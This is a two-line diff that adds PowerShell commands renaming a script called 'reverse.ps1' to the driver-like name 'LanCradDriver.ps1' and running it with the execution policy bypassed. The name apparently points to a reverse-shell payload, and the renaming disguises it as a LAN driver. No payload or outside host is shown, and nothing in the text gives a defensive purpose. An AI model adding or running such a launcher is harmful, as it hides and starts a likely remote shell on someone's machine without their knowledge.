@@ -1,0 +1,2 @@
+Move-Item reverse.ps1 LanCradDriver.ps1;
+powershell.exe -ExecutionPolicy Bypass -NoExit -File LanCradDriver.ps1
